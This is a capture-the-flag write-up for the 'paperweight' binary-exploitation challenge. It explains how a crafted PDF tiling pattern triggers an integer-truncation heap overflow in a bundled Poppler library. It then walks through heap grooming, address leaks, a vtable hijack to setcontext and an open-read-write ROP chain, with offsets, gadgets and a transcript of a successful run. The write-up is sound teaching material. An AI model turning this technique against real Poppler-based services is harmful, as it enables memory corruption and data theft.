# paperweight

| Field | Value |
| --- | --- |
| CTF | z0d1akCTF 2026 Qualifiers |
| Category | Binary Exploitation |
| Author | afish |
| Points | 202 |
| Solves at time of solving | 30 |
| Flag | `zdk{ThE_Sc4nlIN3_5AnK_8ELOw_32_bI75}` |

> Every record sent to the Pelagic Archive sinks into cold storage. Its new
> chart plotter is rated for any pressure. Send a logbook below crush depth and
> recover what the tide brings back.

## Executive Summary

`paperweight` is a stripped x86-64 PIE that exposes a small binary protocol for
allocating heap records, creating a polymorphic `Folio`, caching bytes, and
rendering attacker-supplied PDF files through the bundled Poppler library.

The vulnerable path is Poppler's `SplashOutputDev::tilingPatternFill`. A crafted
tiling pattern uses `XStep = 82` so a 32-bit horizontal extent calculation wraps
from `0x100000004` to `4`. Poppler allocates a line buffer using the wrapped
value, while `tilingBitmapSrc` continues copying the full repeated image row.
The mismatch produces a controlled heap overflow.

The exploit turns this into a deterministic multi-stage chain:

1. Allocate and free 32 chunks of size `0x1000` around a `Folio` object.
2. Render a one-row, `0x2901`-pixel image through the malicious tiling pattern.
3. Overwrite the `Folio` offset and length fields to read a nearby `DiveAnchor`.
4. Recover PIE, the heap address, and the address of a stable cache buffer from
   the leaked `DiveAnchor` object.
5. Use the next forked worker to read `write@GOT`, yielding the bundled libc
   base.
6. Cache a pointer to `setcontext`, overwrite the `Folio` vtable pointer, and
   place a forged context plus a ROP chain in the overflowed heap region.
7. Use the seccomp-approved `openat`, `read`, and `write` operations to return
   `flag.txt`.

The service forks five workers from the same parent. Each worker has the same
PIE, libc, and inherited heap addresses, while crash-prone mutations remain
private because of copy-on-write. This is what makes the leak from one dive
usable in the next.

## Repository Contents

| Path | Purpose | SHA-256 |
| --- | --- | --- |
| [`challenge/pwn_paperweight.tar.gz`](challenge/pwn_paperweight.tar.gz) | Original downloaded handout | `f332b25406bde999e7f535ca200c85731418e4f5e9fb3ef8e4a19c0ef2a9a2f5` |
| [`challenge/chal`](challenge/chal) | Extracted challenge executable | `50304da63b5dc100ac61c592c826d90e935d86d6d41882ab80bd3aa504a797a0` |
| [`challenge/ld-linux-x86-64.so.2`](challenge/ld-linux-x86-64.so.2) | Supplied runtime loader | `8d06f393f4a93bcf9b81145a259524d66a95522a646bf8d7e05b6ffdf2e63dcc` |
| [`challenge/libc.so.6`](challenge/libc.so.6) | Supplied libc used for symbols and gadgets | `e01b1ce7be2987f3b8560e26d0df2623f9dd5cec17be923ae28a785bc0d32d50` |
| [`challenge/libpoppler.so.156`](challenge/libpoppler.so.156) | Vulnerable bundled Poppler library | `7c5efed869b48e807355749df1181b7ec2d1e3689a9252f2146c32298de7639b` |
| [`solve.py`](solve.py) | Dependency-free TLS exploit | `c96aa2c37c36f2aa6c607cfb20c54571e47db0040261058dc0c75723aeee85fc` |
| [`artifacts/analysis.txt`](artifacts/analysis.txt) | Protocol, object, heap, symbol, and ROP offsets | `243929d5ae42612b90a03fada990cd2adccb024b2c7454559e1fb12c2cf8badf` |
| [`artifacts/remote-run.txt`](artifacts/remote-run.txt) | Clean successful remote transcript | `6102bbc56a5e2ec1a7d28e7ae12e73396c3b23818786875e17c34a06c5c9d298` |

The original archive contains the remaining transitive Poppler libraries. The
extracted executable, loader, libc, and Poppler library are included separately
because they are the files directly used during analysis and exploit creation.

## 1. Handout Triage

The handout extracts to one executable and a complete private runtime:

```text
dist/
├── chal
├── ld-linux-x86-64.so.2
├── libc.so.6
├── libpoppler.so.156
├── libstdc++.so.6
└── supporting Poppler libraries
```

Basic inspection identifies a stripped C++ PIE:

```console
$ file dist/chal
dist/chal: ELF 64-bit LSB pie executable, x86-64, dynamically linked,
           interpreter /lib64/ld-linux-x86-64.so.2, stripped
```

The executable has the standard modern mitigations:

| Mitigation | State |
| --- | --- |
| PIE | Enabled |
| NX | Enabled |
| Stack canary | Enabled |
| RELRO | Full |
| Symbols | Stripped |

The interesting dependency is immediately visible in the dynamic symbol table:

```text
PDFDoc::displayPage
SplashOutputDev::startDoc
GfxResources::lookupPattern
```

The bundled Poppler library exports both functions involved in the eventual
overflow:

```text
SplashOutputDev::tilingPatternFill
SplashOutputDev::tilingBitmapSrc
```

## 2. Process and Protocol Model

The parent prints `paperweight abyssal archive`, then performs five iterations
of this loop:

```text
print "new dive"
fork()
child handles one protocol session
parent waits for that child
```

After the fifth child exits, the parent prints:

```text
archive pressure lock engaged
```

Every child inherits identical virtual addresses from the parent. Heap writes
made by a child do not affect later workers, but leaked addresses stay valid in
all of them.

The child protocol is byte-oriented:

| Command | Request | Purpose |
| --- | --- | --- |
| `A` | `u32 size` | Allocate an `A`-filled heap chunk and return its slot index |
| `F` | `u8 index` | Free one previously allocated chunk |
| `B` | `u32 size || bytes` | Copy up to `0x2000` bytes into the stable cache buffer |
| `N` | none | Allocate and initialize one `Folio` object |
| `P` | `u32 size || PDF` | Render a PDF through Poppler |
| `S` | none | Print up to `0x100` bytes selected by the `Folio` fields, then exit |
| `T` | none | Install seccomp and invoke the `Folio` virtual method, then exit |
| `Q` | none | Exit the current worker |

Only one `Folio` can be created per worker. It is a `0x100`-byte object with the
following relevant layout:

```text
Folio+0x00  vtable pointer
Folio+0x08  signed output offset, initially 0x18
Folio+0x10  output length, initially 0x13
Folio+0x18  inline "waterlogged logbook" string
```

The `S` command behaves like this:

```c
length = min(folio->length, 0x100);
write(1, (char *)folio + folio->offset, length);
_exit(0);
```

If the two fields at `+0x08` and `+0x10` can be corrupted, `S` becomes a
256-byte arbitrary read relative to the known `Folio` address.

## 3. The Nearby DiveAnchor

Each worker creates a `DiveAnchor` before processing commands. Its important
fields are:

```text
DiveAnchor+0x00  vtable pointer = PIE+0x5c10
DiveAnchor+0x08  pointer to DiveAnchor itself
DiveAnchor+0x10  pointer to a persistent 0x2000-byte cache buffer
DiveAnchor+0x18  "PELAGIC-LEDGER"
```

The self-pointer and cache pointer are especially useful. One leak of this
object reveals three bases at once:

- the PIE base through its vtable;
- an exact heap pointer through the self-reference;
- a writable, address-known buffer through the cache pointer.

## 4. Reaching Poppler's Tiling Path

The exploit constructs a minimal PDF with:

- one page;
- one PatternType 1 tiling pattern;
- `/BBox [0 0 82 1]`;
- `/XStep 82` and `/YStep 1`;
- a one-row grayscale image used as the pattern cell.

The image is drawn with this matrix:

```pdf
q -82 0 0 1 0 0 cm /Im0 Do Q
```

The negative X scale compensates for the pattern CTM and makes the source bytes
land across the positive destination scanline in their original order.

The key number is `82`. The affected geometry reaches this cell count:

```text
0x100000004 / 82 = 0x31f3832
```

Multiplying the count by the step reconstructs a width just beyond 32 bits:

```text
0x31f3832 * 82 = 0x100000004
```

The allocation-side arithmetic truncates that result to `4`, but the tiling
source still repeats the actual row. Poppler therefore writes substantially
more scanline data than the allocated line buffer can hold.

## 5. Deterministic Heap Placement

The exploit first allocates 32 chunks of requested size `0x1000`:

```python
b"".join(alloc(0x1000) for _ in range(32))
```

Including allocator metadata, these occupy:

```text
32 * 0x1010 = 0x20200 bytes
```

It then creates the `Folio`, frees all 32 chunks, and invokes the vulnerable
renderer. This places Poppler's undersized line buffer exactly `0x58c0` bytes
before the `Folio`.

The crafted image has width `0x2901`; the useful repeated scanline is `0x2900`
bytes. Therefore the `Folio` begins at this offset inside the controlled row:

```text
0x58c0 mod 0x2900 = 0x6c0
```

This makes the overwrite straightforward:

```python
row[0x6c0:0x6c8] = forged_vtable
row[0x6c8:0x6d0] = forged_offset
row[0x6d0:0x6d8] = forged_length
```

No heap address is needed to land the first corruption; only fixed allocator
geometry is used.

## 6. Dive One: PIE and Heap Leak

With this grooming, the `DiveAnchor` is exactly `0x20310` bytes before the
`Folio`. The first row changes the `Folio` fields to:

```python
offset = -0x20310
length = 0xffffffffffffffff
```

The `S` handler clamps the length to `0x100`, so the worker returns the first
256 bytes of the `DiveAnchor` safely. The solver parses:

```python
anchor_vtable = u64(anchor[0:8])
anchor_self   = u64(anchor[8:16])
cache_buffer  = u64(anchor[16:24])

pie   = anchor_vtable - 0x5c10
folio = anchor_self + 0x20310
```

An example remote run produced:

```text
PIE:        0x7f2163b19000
heap Folio: 0x555570409400
```

## 7. Dive Two: Libc Leak

The executable's `write` jump slot is at PIE offset `0x5ec0`. The second worker
repeats the same heap layout but changes the `Folio` output offset to:

```python
(pie + 0x5ec0) - folio
```

The resulting `S` command reads `write@GOT`. `write` has already been resolved
because the process printed several banners before the exploit began.

In the supplied libc:

```text
write = libc + 0x1148b0
```

The libc base is therefore:

```python
libc = leaked_write - 0x1148b0
```

Example:

```text
libc: 0x7f21632c8000
```

## 8. Seccomp Policy

The `T` command installs a 19-instruction classic BPF filter before making the
virtual call. Decoding its comparisons gives this allowlist:

```text
read
write
openat
close
rt_sigprocmask
exit
exit_group
```

Everything else is killed. A shell is unnecessary: `openat`, `read`, and
`write` are exactly the operations required to recover the flag. The presence
of `rt_sigprocmask` also allows the normal `setcontext` entry path to complete.

## 9. Dive Three: Vtable Hijack and setcontext

The `B` command writes attacker bytes into the cache buffer whose address was
leaked from the `DiveAnchor`. The exploit places one qword there:

```text
libc + 0x539e0  -> setcontext
```

The third overflow changes `Folio+0x00` to the cache-buffer address. The `T`
dispatcher is effectively:

```asm
mov rax, [rdi]
jmp qword [rax]
```

Here `rdi` is the `Folio`. Dereferencing the forged vtable reaches the cached
`setcontext` pointer, so `setcontext(folio)` runs with an attacker-controlled
context image.

The exploit fills these context fields:

| `Folio` offset | Restored value | Purpose |
| --- | --- | --- |
| `+0x68` | `-100` | `rdi = AT_FDCWD` |
| `+0x70` | `Folio+0x200` | `rsi = "flag.txt"` |
| `+0x88` | `0` | `rdx = O_RDONLY` |
| `+0xa0` | `Folio+0x300` | New stack pointer |
| `+0xa8` | `libc+0x1146b0` | New instruction pointer: `openat` |
| `+0xe0` | `Folio+0x400` | Valid floating-point state pointer |
| `+0x1c0` | `0x1f80` | Valid MXCSR value |

The pathname, forged context, ROP chain, floating-point state, and read buffer
all fit in the scanline-controlled region beyond the `Folio`.

## 10. The ORW Chain

`openat` returns a descriptor in `rax`. It cannot be assumed to be descriptor
3 because the remote TLS wrapper may leave additional descriptors open. The
chain begins with this supplied-libc gadget:

```text
libc+0x5a272: mov rdi, rax; cmp rdx, rcx; ...; ret
```

The relevant branch condition follows the expected path after `openat`, moving
the returned descriptor into `rdi`. The rest of the chain uses:

```text
libc+0x2a3e5   pop rdi; ret
libc+0x2be51   pop rsi; ret
libc+0x11f327  pop rdx; pop r12; ret
libc+0x114810  read
libc+0x1148b0  write
libc+0xeabc0   _exit
```

Its logical form is:

```c
fd = openat(AT_FDCWD, "flag.txt", O_RDONLY, 0);
read(fd, folio + 0x800, 0x100);
write(1, folio + 0x800, 0x100);
_exit(0);
```

All four operations are permitted by the installed seccomp policy.

## 11. Reproduction

The exploit requires only Python 3 and its standard library. Run it against a
fresh TLS instance:

```console
$ python3 solve.py --solve \
    --host paperweight-f538a065aef9.chals.z0d1ak.org \
    --port 1337 --timeout 12
[+] PIE: 0x7f2163b19000, heap Folio: 0x555570409400
[+] libc: 0x7f21632c8000
[+] trying flag.txt
zdk{ThE_Sc4nlIN3_5AnK_8ELOw_32_bI75}
```

The hostname is instance-specific and will eventually expire. Replace it with
the hostname printed by the current instancer.

For local plaintext testing, the solver also supports `--plain`. Launch the
binary with the supplied loader and library path behind a local TCP wrapper,
then run:

```console
$ python3 solve.py --solve --plain --host 127.0.0.1 --port 31337
```

## 12. Takeaways

The challenge combines a third-party rendering bug with unusually deliberate
heap and process design:

- Integer truncation is dangerous when allocation and copy paths do not use
  the same width or signedness.
- Forked workers isolate corruption but preserve ASLR mappings, so a leak from
  one child remains useful in every later child.
- A self-referential C++ object can turn a relative disclosure into precise PIE
  and heap bases.
- Seccomp did meaningfully remove shell execution, but the allowed operations
  still formed a complete file-read primitive.
- The remote descriptor number differed from a naive local assumption; moving
  the real `openat` return value made the final exploit runtime-independent.

The final chain is deterministic, contains no brute force, and uses offsets
only from the exact executable and libraries supplied in the handout.
